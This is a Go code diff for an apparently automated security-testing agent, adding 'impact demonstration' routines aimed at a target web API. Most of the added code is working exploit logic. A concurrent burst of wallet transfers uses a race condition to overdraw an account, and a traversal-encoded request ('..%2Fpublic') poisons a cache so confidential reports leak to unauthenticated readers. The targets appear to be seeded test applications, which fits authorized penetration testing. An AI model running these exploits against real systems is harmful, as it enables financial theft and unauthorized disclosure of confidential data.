@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/vKS-Rajput/doge/pkg/domain"
@@ -73,12 +74,20 @@ func (r *ImpactResearcher) Execute(ctx context.Context, brief *domain.MissionBri
 		}
 	}
 
+	if strings.Contains(strings.ToLower(brief.Title), "cache") || strings.Contains(strings.ToLower(brief.Description), "cache") {
+		return r.demonstrateCacheBleedImpact(ctx, brief, principals, result, start, &requestCount)
+	}
+
+	if strings.Contains(strings.ToLower(brief.Title), "race") || strings.Contains(strings.ToLower(brief.Title), "overdraw") ||
+		strings.Contains(strings.ToLower(brief.Description), "race") || strings.Contains(strings.ToLower(brief.Description), "overdraw") {
+		return r.demonstrateRaceImpact(ctx, brief, principals, result, start, &requestCount)
+	}
+
 	if strings.Contains(strings.ToLower(brief.Title), "workflow") || strings.Contains(strings.ToLower(brief.Description), "workflow") {
 		return r.demonstrateWorkflowImpact(ctx, brief, principals, result, start, &requestCount)
 	}
 
-	if strings.Contains(strings.ToLower(brief.Title), "batch") || strings.Contains(strings.ToLower(brief.Title), "bleed") ||
-		strings.Contains(strings.ToLower(brief.Description), "batch") || strings.Contains(strings.ToLower(brief.Description), "bleed") {
+	if strings.Contains(strings.ToLower(brief.Title), "batch") || strings.Contains(strings.ToLower(brief.Description), "batch") {
 		return r.demonstrateBatchContextBleedImpact(ctx, brief, principals, result, start, &requestCount)
 	}
 
@@ -462,6 +471,218 @@ func (r *ImpactResearcher) demonstrateBatchContextBleedImpact(
 		result.Summary = "Impact demonstrated: extracted classified vault credentials via batch context bleed"
 	} else {
 		result.Summary = "Batch context bleed impact demonstration attempted"
+	}
+
+	return result, nil
+}
+
+func (r *ImpactResearcher) demonstrateRaceImpact(
+	ctx context.Context,
+	brief *domain.MissionBrief,
+	principals []researchPrincipal,
+	result *domain.MissionResult,
+	start time.Time,
+	requestCount *int,
+) (*domain.MissionResult, error) {
+	targetURL := strings.TrimRight(brief.TargetBaseURL, "/")
+
+	authHeader := ""
+	for _, p := range principals {
+		if p.token != "" {
+			if strings.HasPrefix(p.token, "Bearer ") {
+				authHeader = p.token
+			} else {
+				authHeader = "Bearer " + p.token
+			}
+			break
+		}
+	}
+	if authHeader == "" {
+		for _, tok := range brief.Credentials {
+			if strings.HasPrefix(tok, "Bearer ") {
+				authHeader = tok
+			} else {
+				authHeader = "Bearer " + tok
+			}
+			break
+		}
+	}
+
+	headers := map[string]string{
+		"Content-Type": "application/json",
+	}
+	if authHeader != "" {
+		headers["Authorization"] = authHeader
+	}
+
+	// 1. Check initial balance
+	balURL := targetURL + "/api/v1/wallet/balance"
+	initBalEv, _ := r.httpClient.Do(ctx, "GET", balURL, headers, "")
+	if initBalEv != nil {
+		*requestCount++
+		result.Evidence = append(result.Evidence, *initBalEv)
+	}
+
+	// 2. Perform aggressive 3-request concurrent burst of 80.00 USD
+	transferURL := targetURL + "/api/v1/wallet/transfer"
+	transferPayload := `{"recipient": "impact_research_drain_vault", "amount": 80.00}`
+
+	var wg sync.WaitGroup
+	burstCount := 3
+	wg.Add(burstCount)
+	responses := make([]*domain.ExperimentEvidence, burstCount)
+
+	for i := 0; i < burstCount; i++ {
+		idx := i
+		go func() {
+			defer wg.Done()
+			ev, err := r.httpClient.Do(ctx, "POST", transferURL, headers, transferPayload)
+			if err == nil && ev != nil {
+				responses[idx] = ev
+			}
+		}()
+	}
+	wg.Wait()
+	*requestCount += burstCount
+
+	successCount := 0
+	for _, ev := range responses {
+		if ev != nil {
+			if ev.ResponseStatus == 200 {
+				successCount++
+			}
+			result.Evidence = append(result.Evidence, *ev)
+		}
+	}
+
+	// 3. Measure resulting balance deficit
+	finalBalEv, err := r.httpClient.Do(ctx, "GET", balURL, headers, "")
+	*requestCount++
+	if err == nil && finalBalEv != nil {
+		result.Evidence = append(result.Evidence, *finalBalEv)
+	}
+
+	var balData struct {
+		Balance      float64 `json:"balance"`
+		TotalDebited float64 `json:"total_debited"`
+		Overdrawn    bool    `json:"overdrawn"`
+	}
+	if finalBalEv != nil {
+		json.Unmarshal([]byte(finalBalEv.ResponseBody), &balData)
+	}
+
+	impactDemonstrated := balData.Overdrawn || balData.Balance < 0
+
+	if impactDemonstrated {
+		result.Observations = append(result.Observations, domain.MissionObservation{
+			Type: "impact_assessed",
+			Description: fmt.Sprintf(
+				"Catastrophic financial impact demonstrated: Parallel transaction burst forced wallet into negative balance (%.2f USD deficit, total debited %.2f USD). Integrity completely broken.",
+				balData.Balance, balData.TotalDebited,
+			),
+			Endpoint:   "/api/v1/wallet/transfer",
+			StatusCode: 200,
+			Details: map[string]any{
+				"final_balance":    balData.Balance,
+				"total_debited":    balData.TotalDebited,
+				"overdrawn":        true,
+				"financial_loss":   -balData.Balance,
+				"criticality":      "CRITICAL",
+				"integrity_impact": "UNRESTRICTED_FUND_CREATION",
+			},
+			ObservedAt: time.Now().UTC(),
+		})
+	}
+
+	result.Status = domain.MissionCompleted
+	result.RequestsMade = *requestCount
+	result.Duration = time.Since(start)
+	result.CompletedAt = time.Now().UTC()
+	if impactDemonstrated {
+		result.Summary = fmt.Sprintf("Impact demonstrated: arbitrary fund creation and account overdraft ($%.2f deficit)", -balData.Balance)
+	} else {
+		result.Summary = "Race condition impact demonstration attempted"
+	}
+
+	return result, nil
+}
+
+func (r *ImpactResearcher) demonstrateCacheBleedImpact(
+	ctx context.Context,
+	brief *domain.MissionBrief,
+	principals []researchPrincipal,
+	result *domain.MissionResult,
+	start time.Time,
+	requestCount *int,
+) (*domain.MissionResult, error) {
+	targetURL := strings.TrimRight(brief.TargetBaseURL, "/")
+
+	adminAuth := ""
+	for k, tok := range brief.Credentials {
+		if strings.Contains(strings.ToLower(k), "admin") || strings.Contains(strings.ToLower(tok), "admin") {
+			if strings.HasPrefix(tok, "Bearer ") {
+				adminAuth = tok
+			} else {
+				adminAuth = "Bearer " + tok
+			}
+			break
+		}
+	}
+	if adminAuth == "" {
+		for _, p := range principals {
+			if p.token != "" {
+				adminAuth = "Bearer " + p.token
+				break
+			}
+		}
+	}
+
+	// 1. Poison cache with traversal encoding
+	poisonURL := targetURL + "/api/v1/reports/private/..%2Fpublic"
+	poisonEv, err := r.httpClient.Do(ctx, "GET", poisonURL, map[string]string{"Authorization": adminAuth}, "")
+	*requestCount++
+	if err == nil && poisonEv != nil {
+		result.Evidence = append(result.Evidence, *poisonEv)
+	}
+
+	// 2. Exfiltrate via unauthenticated request to public cache
+	publicURL := targetURL + "/api/v1/reports/public"
+	publicEv, err := r.httpClient.Do(ctx, "GET", publicURL, map[string]string{}, "")
+	*requestCount++
+	if err == nil && publicEv != nil {
+		result.Evidence = append(result.Evidence, *publicEv)
+	}
+
+	hasConfidential := publicEv != nil && (strings.Contains(publicEv.ResponseBody, "CONFIDENTIAL") ||
+		strings.Contains(publicEv.ResponseBody, "Project Titan") ||
+		strings.Contains(publicEv.ResponseBody, "Valuation") ||
+		strings.Contains(publicEv.ResponseBody, "4,200,000,000"))
+
+	if hasConfidential {
+		result.Observations = append(result.Observations, domain.MissionObservation{
+			Type: "impact_assessed",
+			Description: "Confidential executive audit records successfully exfiltrated via unauthenticated cache collision bleed. " +
+				"Exfiltrated payload: 'Project Titan M&A Target Valuation $4,200,000,000 USD'.",
+			Endpoint:   "/api/v1/reports/public",
+			StatusCode: 200,
+			Details: map[string]any{
+				"exfiltrated_asset": "CONFIDENTIAL AUDIT: Project Titan M&A Target Valuation $4,200,000,000 USD",
+				"unauthenticated":   true,
+				"criticality":       "CRITICAL",
+				"cia_impact":        "TOTAL_CONFIDENTIALITY_BREACH",
+			},
+			ObservedAt: time.Now().UTC(),
+		})
+	}
+
+	result.Status = domain.MissionCompleted
+	result.RequestsMade = *requestCount
+	result.Duration = time.Since(start)
+	result.CompletedAt = time.Now().UTC()
+	if hasConfidential {
+		result.Summary = "Impact demonstrated: unauthenticated exfiltration of classified executive M&A valuation ($4.2B)"
+	} else {
+		result.Summary = "Cache bleed impact demonstration attempted"
 	}
 
 	return result, nil
